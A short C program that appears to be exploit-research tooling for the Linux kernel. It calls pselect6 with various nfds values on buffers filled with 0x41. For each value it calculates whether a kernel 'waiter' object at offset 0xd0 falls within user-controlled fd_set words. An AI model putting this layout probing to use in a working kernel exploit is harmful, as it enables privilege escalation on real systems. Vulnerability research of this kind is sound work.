#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/select.h>
#include <sys/time.h>

int main() {
    /* Test different NFDS values for pselect6 */
    int nfds_values[] = {256, 384, 512, 576, 640, 768, 896, 1024, 1025, 1280, 1664};
    int num_values = sizeof(nfds_values) / sizeof(nfds_values[0]);

    for (int i = 0; i < num_values; i++) {
        int nfds = nfds_values[i];
        /* Allocate fd_set buffer - large enough for any NFDS */
        int buf_size = (nfds + 7) / 8 * 3 + 64;  /* 3 sets + padding */
        char *buf = malloc(buf_size);
        if (!buf) continue;
        memset(buf, 0x41, buf_size);  /* Fill with 0x41 */

        struct timespec ts = {0, 0};  /* Zero timeout - don't block */

        errno = 0;
        int ret = syscall(SYS_pselect6, nfds, buf, buf, buf, &ts, 0);
        int saved_errno = errno;

        /* Calculate where waiter would be */
        /* waiter offset from fd_set base = 0xd0 = word 26 */
        /* word 26 = byte offset 208 from fd_set base */
        /* For NFDS, words_per_set = ceil(NFDS/64) */
        int words_per_set = (nfds + 63) / 64;
        int waiter_word = 26;
        int set_idx = waiter_word / words_per_set;
        int word_in_set = waiter_word % words_per_set;
        const char *set_names[] = {"in_set", "out_set", "ex_set", "res_in", "res_out", "res_ex"};
        const char *controlled = (set_idx < 3) ? "YES" : "NO";

        printf("[*] NFDS=%4d: words_per_set=%d ret=%d errno=%d (%s) waiter in %s[%d] user可控=%s\n",
               nfds, words_per_set, ret, saved_errno,
               ret == 0 ? "OK" : (saved_errno == 9 ? "EBADF(expected)" : strerror(saved_errno)),
               set_idx < 6 ? set_names[set_idx] : "???",
               word_in_set, controlled);

        free(buf);
    }

    return 0;
}
